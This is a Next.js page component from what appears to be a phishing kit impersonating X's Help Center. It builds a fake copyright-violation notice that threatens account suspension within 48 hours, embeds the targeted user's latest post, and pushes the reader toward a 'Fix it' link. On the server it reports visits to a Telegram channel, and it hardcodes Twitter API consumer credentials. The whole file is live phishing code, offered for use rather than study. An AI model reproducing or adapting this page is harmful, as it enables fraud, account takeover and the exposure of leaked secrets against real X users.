import { Footer } from "@/components/footer";
import { XIcon } from "@/components/icons/x";
import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";
import type { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = {
	title: "Help Center",
	description:
		"Get instant answers to the most common questions and learn how to use X like a pro.",
};

type Props = {
	params: {
		username: string;
	};
};

const consumerKey = "3yWDrwZHhFzkUnQVqcXLu8ctm";
const consumerSecret = "UXcJW0m5EDeXAp1TtqtfjXz40pcOLaoHvyuSfvjkPrThyBVwVJ";

const getBearerToken = async (consumerKey: string, consumerSecret: string) => {
	const encodedCredentials = Buffer.from(
		`${consumerKey}:${consumerSecret}`,
	).toString("base64");

	try {
		const response = await fetch("https://api.twitter.com/oauth2/token", {
			method: "POST",
			headers: {
				Authorization: `Basic ${encodedCredentials}`,
				"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
			},
			body: "grant_type=client_credentials",
		});

		const data = await response.json();
		console.log("Bearer Token Data:", data); // Adicione este log

		return data.access_token;
	} catch (error) {
		console.error("Error fetching bearer token:", error); // Adicione este log
		throw new Error("Internal Server Error");
	}
};

const getUserIdByUsername = async (username: string, bearerToken: string) => {
	const response = await fetch(
		`https://api.twitter.com/2/users/by/username/${username ?? "elonmusk"}`,
		{
			headers: {
				Authorization: `Bearer ${bearerToken}`,
			},
		},
	);

	const data = await response.json();
	console.log("User ID Data:", data); // Adicione este log

	return data?.data?.id;
};

const getLastTweet = async (userId: string, bearerToken: string) => {
	const response = await fetch(
		`https://api.twitter.com/2/users/${userId}/tweets`,
		{
			headers: {
				Authorization: `Bearer ${bearerToken}`,
			},
		},
	);

	const data = await response.json();
	console.log("Last Tweet Data:", data); // Adicione este log

	if (response.ok) {
		const lastTweet = data.data.at(-1); // Último tweet

		console.log("Last Tweet:", lastTweet); // Adicione este log
		return {
			text: lastTweet.text,
			id: lastTweet.id,
		};
	}
	console.log("Error fetching last tweet:", data); // Adicione este log
};

// ...existing code...

const getTweetUrl = async (username = "elonmusk") => {
	const bearerToken = await getBearerToken(consumerKey, consumerSecret);

	const userId = await getUserIdByUsername(username, bearerToken);
	console.log("USER ID -> ", userId);

	const tweetInfo = await getLastTweet(userId, bearerToken);
	console.log("tweetInfo -> ", tweetInfo);

	return tweetInfo
		? `https://twitter.com/user/status/${tweetInfo.id}`
		: "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20";
};

export default async function HelpCenterPage({ params }: Props) {
	const { username } = await params;

	const tweetUrl = await getTweetUrl(username);

	if (typeof window === "undefined") {
		const headers = new Headers(); // Headers reais serão passados pelo framework
		await sendDataToTelegram(
			headers,
			process.env.HOST || "localhost",
			`/help/${username}`,
		);
	}

	return (
		<main className="flex flex-col items-center bg-white">
			<header className="sticky top-0 z-10 w-full px-6 pt-3 bg-white">
				<a
					className="h-[84px] flex items-center gap-2.5"
					href="https://help.x.com/en"
					data-twtr-scribe-section="u01b-navigation"
					data-twtr-scribe-element="AZRA"
					data-twtr-scribe-component="twitter-logo-icon"
					aria-label="Central de Ajuda home"
				>
					<XIcon className="size-7" />
					<span className="text-2xl font-bold text-black">Help Center</span>
				</a>
			</header>

			<div className="p-5 text-black md:max-w-[596px]">
				<span className="text-4xl font-bold md:text-6xl lg:text-7xl">
					Copyright Violation and Appeal Process
				</span>

				<hr className="w-full h-[0px] border-t border-[#657786] my-8 lg:my-16" />

				<p className="mb-16 lg:text-lg">
					We have received a formal complaint regarding a copyright violation
					related to your post published below. Following a thorough review, our
					team has confirmed the validity of this claim. As a result, your
					account is at risk of suspension if we do not receive an appeal from
					you within the next 48 hours. We take these matters seriously to
					ensure a fair platform for all content creators, and your cooperation
					is essential in resolving this issue promptly.
				</p>

				<p className="mb-8 lg:text-lg">
					If you believe this decision is incorrect or if you have additional
					information that could support your case, you have the right to submit
					an appeal. To initiate this process, please access the appeal form
					provided in the next step and fill it out, including a detailed
					explanation. It is crucial to submit your appeal within the 48-hour
					timeframe to prevent the suspension of your account.
				</p>

				<div className="px-6 flex flex-col items-center">
					<div className="relative w-[270px]">
						<iframe
							title=" "
							src={`https://twitframe.com/show?url=${tweetUrl ?? "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20"}`}
							className="w-full h-[100px] border-0 pointer-events-none overflow-hidden blur-sm"
						/>
						<img
							src="https://cdn-icons-png.flaticon.com/512/181/181534.png"
							alt="Imagem do Cadeado"
							className="absolute top-5 left-1/2 -translate-x-1/2 size-[100px]"
						/>
					</div>

					<div className="flex items-center justify-center px-6 pt-14">
						<Link
							className="py-2.5 px-14 text-[#0083EB] text-sm font-medium"
							href="/"
						>
							Fix it
						</Link>
					</div>
				</div>
			</div>

			<Footer />
		</main>
	);
}
